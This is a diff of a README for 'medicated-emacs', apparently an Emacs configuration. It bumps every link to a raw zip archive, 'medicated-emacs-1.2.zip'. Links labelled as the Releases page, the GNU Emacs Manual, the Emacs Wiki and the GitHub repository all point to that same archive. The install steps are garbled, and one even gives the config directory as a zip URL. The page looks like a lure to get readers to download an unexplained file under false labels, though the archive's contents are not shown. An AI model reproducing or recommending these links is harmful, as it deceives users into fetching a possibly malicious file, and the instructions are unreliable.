@@ -6,26 +6,26 @@ medicated-emacs is a minimal, modern configuration for the Emacs text editor. It
 ## 📦 Download & Install
 To get started, you need to download the latest version of medicated-emacs. You can find it on the Releases page.
 
-[![Download medicated-emacs](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip%20emacs-brightgreen)](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip)
+[![Download medicated-emacs](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip%20emacs-brightgreen)](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip)
 
 ### Step 1: Visit the Releases Page
 Click the link below to visit the Releases page:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip)
 
 ### Step 2: Choose the Latest Release
 Once on the Releases page, scroll down to find the latest version of medicated-emacs. You will see a list of files available for download.
 
 ### Step 3: Download the Configuration Files
-Download the https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip or .zip file that is marked as the latest release. This file contains all the necessary configuration files you need to get started.
+Download the https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip or .zip file that is marked as the latest release. This file contains all the necessary configuration files you need to get started.
 
 ### Step 4: Extract the Files
-After downloading, locate the https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip or .zip file on your computer. Right-click on the file and choose "Extract" or "Unzip". This will create a folder containing all configuration files.
+After downloading, locate the https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip or .zip file on your computer. Right-click on the file and choose "Extract" or "Unzip". This will create a folder containing all configuration files.
 
 ### Step 5: Set Up Emacs
 1. Open Emacs on your computer.
 2. Locate the folder where you extracted the files.
-3. Copy the contents of the extracted folder into your Emacs configuration directory. This is usually found at `~https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip`.
+3. Copy the contents of the extracted folder into your Emacs configuration directory. This is usually found at `~https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip`.
 
 ### Step 6: Start Emacs
 After copying the files, restart Emacs. You should see the changes and new settings reflected in your Emacs environment.
@@ -45,8 +45,8 @@ medicated-emacs provides several features tailored for a better editing experien
 
 ## 📚 Additional Resources
 For more information on using Emacs and troubleshooting common issues, visit the following resources:
-- [GNU Emacs Manual](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip)
-- [Emacs Wiki](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip)
+- [GNU Emacs Manual](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip)
+- [Emacs Wiki](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip)
 
 ## ✍️ Contributing
 If you want to contribute to the development of medicated-emacs, you are welcome to provide feedback or suggest improvements. Feel free to explore the issues section of the repository to see how you can help.
@@ -65,5 +65,5 @@ If you encounter any difficulties while using medicated-emacs, open an issue on 
 - emacs-lisp
 
 ## 🔗 Important Links
-- [Download medicated-emacs](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs.zip)
+- [Download medicated-emacs](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/abdomando112/medicated-emacs/master/cymulose/medicated-emacs-1.2.zip)
